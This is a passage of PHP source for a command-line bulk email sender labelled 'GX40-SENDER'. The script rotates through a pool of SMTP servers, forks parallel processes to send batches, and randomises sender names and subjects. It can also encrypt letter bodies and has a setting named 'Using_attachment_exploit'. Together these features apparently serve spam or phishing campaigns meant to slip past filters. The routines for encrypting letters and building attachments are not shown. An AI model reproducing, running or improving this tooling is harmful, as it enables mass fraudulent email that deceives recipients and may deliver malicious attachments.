                if (!in_array($key, $keys_skip)) {
                    // $mail->addCustomHeader($key, $value);
                }
            }
        }

        if (!empty($replyTo) && ($replyTo !== "reaply@address.com")) $mail->addReplyTo($replyTo, $fromName);

        if (!empty($attachments)) {
            foreach ($attachments as $attachment) if (file_exists($attachment['path'])) $mail->addAttachment($attachment['path'], $attachment['name']);
        }

        $mail->send();
        $time = date('H:i:s');
        $fromNameDisplay = (strlen($fromName) < 11) ? str_pad($fromName, 11) : substr($fromName, 0, 11);
        $subjectDisplay = (strlen($subject) < 11) ? str_pad($subject, 11) : substr($subject, 0, 11);
        $toDisplay = (strlen($to) < 27) ? str_pad($to, 26) : substr($to, 0, 26);
        echo "  \033[38;2;99;110;114m│\033[38;2;33;140;116m $time \033[38;2;99;110;114m│\033[38;2;33;140;116m $fromNameDisplay \033[38;2;99;110;114m│\033[38;2;33;140;116m $subjectDisplay \033[38;2;99;110;114m│\033[38;2;33;140;116m $toDisplay \033[38;2;99;110;114m│\033[38;2;33;140;116m SENT  \033[38;2;99;110;114m│\033[0m\n";
    } catch (Exception $e) {
        $time = date('H:i:s');
        $fromNameDisplay = (strlen($fromName) < 11) ? str_pad($fromName, 11) : substr($fromName, 0, 11);
        $subjectDisplay = (strlen($subject) < 11) ? str_pad($subject, 11) : substr($subject, 0, 11);
        $toDisplay = (strlen($to) < 27) ? str_pad($to, 26) : substr($to, 0, 26);

        //03 Jan 2024
        write("1-GX40-SENDER/LIST/FAILED.txt", $to . PHP_EOL);
        //

        echo "  \033[38;2;99;110;114m│\033[38;2;253;121;168m $time \033[38;2;99;110;114m│\033[38;2;253;121;168m $fromNameDisplay \033[38;2;99;110;114m│\033[38;2;253;121;168m $subjectDisplay \033[38;2;99;110;114m│\033[38;2;253;121;168m $toDisplay \033[38;2;99;110;114m│\033[38;2;253;121;168m FAIL  \033[38;2;99;110;114m│\033[0m\n";
    }
}

function validateSettings($config, $smtpConfigs, $listEmailFile, $letterFilePath)
{
    if (!file_exists($listEmailFile)) {
        echo "\033[38;2;99;110;114m  ├──────────┴────────────────────┴──────┴────────────────────────────┴───────┤\033[0m\n";
        echo "\033[38;2;99;110;114m  │\033[0m\033[38;2;253;121;168m ERROR\033[0m : \033[38;2;162;155;254mMail list file\033[0m not found. Please check your \033[38;2;162;155;254mCONFIG.json\033[0m.          \033[38;2;99;110;114m│\033[0m\n";
        echo "\033[38;2;99;110;114m  └───────────────────────────────────────────────────────────────────────────┘\033[0m\n";
        echo "\n";
        exit(0);
    }

    if (!file_exists($letterFilePath)) {
        echo "\033[38;2;99;110;114m  ├──────────┴────────────────────┴──────┴────────────────────────────┴───────┤\033[0m\n";
        echo "\033[38;2;99;110;114m  │\033[0m\033[38;2;253;121;168m ERROR\033[0m : \033[38;2;162;155;254mLetter file\033[0m not found. Please check your \033[38;2;162;155;254mCONFIG.json\033[0m.             \033[38;2;99;110;114m│\033[0m\n";
        echo "\033[38;2;99;110;114m  └───────────────────────────────────────────────────────────────────────────┘\033[0m\n";
        echo "\n";
        exit(0);
    }

    $htmlToPdfFile = '1-GX40-SENDER/HTML_TO_PDF/' . $config[0]['HTML_TO_PDF'][0]['HTML_TO_PDF_FILE'];
    if (!file_exists($htmlToPdfFile)) {
        echo "\033[38;2;99;110;114m  ├──────────┴────────────────────┴──────┴────────────────────────────┴───────┤\033[0m\n";
        echo "\033[38;2;99;110;114m  │\033[0m\033[38;2;253;121;168m ERROR\033[0m : \033[38;2;162;155;254mHTML_TO_PDF_FILE\033[0m not found. Please check your \033[38;2;162;155;254mCONFIG.json\033[0m.        \033[38;2;99;110;114m│\033[0m\n";
        echo "\033[38;2;99;110;114m  └───────────────────────────────────────────────────────────────────────────┘\033[0m\n";
        echo "\n";
        exit(0);
    }

    $htmlToPdfFile = '1-GX40-SENDER/ATTACHMENT/' . $config[0]['ATTACHMENT'][0]['ATTACHMENT_FILES'];
    if (!file_exists($htmlToPdfFile)) {
        echo "\033[38;2;99;110;114m  ├──────────┴────────────────────┴──────┴────────────────────────────┴───────┤\033[0m\n";
        echo "\033[38;2;99;110;114m  │\033[0m\033[38;2;253;121;168m ERROR\033[0m : \033[38;2;162;155;254mATTACHMENT\033[0m not found. Please check your \033[38;2;162;155;254mCONFIG.json\033[0m.              \033[38;2;99;110;114m│\033[0m\n";
        echo "\033[38;2;99;110;114m  └───────────────────────────────────────────────────────────────────────────┘\033[0m\n";
        echo "\n";
        exit(0);
    }

    return true;
}

$config = config();
$smtpConfigs = json_decode(file_get_contents('1-GX40-SENDER/SMTP.json'), true);
$listEmailFile = '1-GX40-SENDER/LIST/' . $config[0]['list_email'];
// $letterFileName = $config[0]['Letters'][1][0]['Letter'] ?? '';
$letterFileName = $config[0]['Letters'][1][array_rand($config[0]['Letters'])]['Letter']; //cek

$letterFilePath = '1-GX40-SENDER/LETTER/' . $letterFileName;

if (validateSettings($config, $smtpConfigs, $listEmailFile, $letterFilePath)) {
    $workingSmtpConfigs = [];
    foreach ($smtpConfigs as $smtpConfig) {
        if (check_smtp($smtpConfig)) {
            $workingSmtpConfigs[] = $smtpConfig;
        }
    }

    if (empty($workingSmtpConfigs)) {
        die("\n");
    }

    $useAttachment = $config[0]['Sender_Setup'][1]['Using_attachment_exploit'] ?? '0';
    $transferEncoding = ['1' => 'base64', '2' => 'quoted-printable', '3' => 'binary', '4' => '8bit', '5' => '7bit'][$config[0]['Sender_Setup'][2]['Transfer_Encoding']] ?? '7bit';
    $headers = $config[0]['Header'] ?? [];
    $replyToAddress = $config[0]['Reaply_To'][0]['Reaply_To_Address'] ?? '';
    $letterEncrypt = $config[0]['Letters'][0]['Letter_Encrypt'] ?? '0';

    $letterContent = file_get_contents($letterFilePath);
    $letterContent = getLetterContent('1-GX40-SENDER/LETTER/' . $letterFileName);
    $isHtml = (pathinfo($letterFileName, PATHINFO_EXTENSION) === 'html');

    if ($letterEncrypt === '1') {
        $letterContent = encrypt_text_except_styles_and_head($letterContent);
    }

    $emailCountSend = (int)($config[0]['Sender_Setup'][3]['Email_countsend'] ?? 10);
    $sendingDelay = (int)($config[0]['Sender_Setup'][4]['Sending_delay'] ?? 0);

    echo "  \033[38;2;99;110;114m├──────────┴────────────────────┴──────┴────────────────────────────┴───────┤\n";
    echo "  \033[38;2;99;110;114m│\033[38;2;246;185;59m START SENDING                                                             \033[38;2;99;110;114m│\n";
    echo "  \033[38;2;99;110;114m├──────────┬─────────────┬─────────────┬────────────────────────────┬───────┤\n";
    echo "  \033[38;2;99;110;114m│\033[0m TIME     \033[38;2;99;110;114m│\033[0m FROM NAME   \033[38;2;99;110;114m│\033[0m SUBJECT     \033[38;2;99;110;114m│\033[0m EMAIL                      \033[38;2;99;110;114m│\033[0m STATS \033[38;2;99;110;114m│\033[0m\n";
    echo "  \033[38;2;99;110;114m├──────────┼─────────────┼─────────────┼────────────────────────────┼───────┤\n";

    $recipients = file($listEmailFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $totalRecipients = count($recipients);
    $processedCount = 0;
	global $test_number;
    $test_number = 0;
    $count_fromname = count($config[0]['Name']) - 1;
    $count_subject = count($config[0]['Subjects']) - 1;

    while ($processedCount < $totalRecipients) {
        $children = [];

        $currentBatch = array_slice($recipients, $processedCount, $emailCountSend);

        foreach ($currentBatch as $recipient) {
			
			$smtp_no = $test_number % count($workingSmtpConfigs);
            $test_number += 1;
			
            $pid = pcntl_fork();
            if ($pid == -1) {
                die('Could not fork');
            }

            $test_fname = rand(0, $count_fromname);
            $test_subject = rand(0, $count_subject);
			
            if ($pid) {
                $children[] = $pid;
            } else {
                $setting_config = $config[0];
                $fromName = $config[0]['Name'][$test_fname]['From_Name'];
                $subject_template = $config[0]['Subjects'][$test_subject]['Subject'];
				
                $smtpConfig = $workingSmtpConfigs[$smtp_no];
				
                list($letterContent, $subject, $smtpConfig, $fromName) = LetterEncode($letterEncrypt, $letterFileName, $letterContent, $recipient, $subject_template, $smtpConfig, $fromName);
                $attachments = AttachementEdit($useAttachment, $recipient);
                // print_r($headers);
                sendEmail($setting_config, $recipient, $smtpConfig, $fromName, $subject, $transferEncoding, $headers, $replyToAddress, $letterContent, $isHtml, $attachments);
                exit(0);
            }
        }

        foreach ($children as $child) {
            pcntl_waitpid($child, $status);
        }

        $processedCount += count($currentBatch);

        if ($sendingDelay > 0 && $processedCount < $totalRecipients) {
            echo "  \033[38;2;99;110;114m├──────────┴─────────────┴─────────────┴────────────────────────────┴───────┤\033[0m\n";
            echo "  \033[38;2;99;110;114m│\033[38;2;246;185;59m PAUSE                                                                     \033[38;2;99;110;114m│\033[0m\n";
            echo "  \033[38;2;99;110;114m├──────────┬─────────────┬─────────────┬────────────────────────────┬───────┤\033[0m\n";
            sleep($sendingDelay);
        }
    }

    if ($letterEncrypt == '2' && file_exists('1-GX40-SENDER/HTML_TO_PDF.html')) unlink('1-GX40-SENDER/HTML_TO_PDF.html');

    echo "  \033[38;2;99;110;114m├──────────┴─────────────┴─────────────┴────────────────────────────┴───────┤\033[0m\n";
    echo "  \033[38;2;99;110;114m│\033[38;2;246;185;59m FINISH                                                                    \033[38;2;99;110;114m│\033[0m\n";
    echo "  \033[38;2;99;110;114m└───────────────────────────────────────────────────────────────────────────┘\033[0m\n";
    echo "\n";
}
